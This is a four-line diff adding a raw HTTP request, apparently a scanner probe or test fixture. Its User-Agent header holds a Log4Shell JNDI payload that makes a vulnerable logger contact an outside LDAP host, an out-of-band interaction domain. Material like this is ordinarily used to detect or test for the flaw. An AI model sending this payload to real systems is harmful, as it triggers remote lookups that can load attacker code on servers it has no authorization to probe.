@@ -1,0 +1,4 @@
+GET / HTTP/1.1
+Host: intranet.example.com
+User-Agent: ${jndi:ldap://x.oastify.com}
+
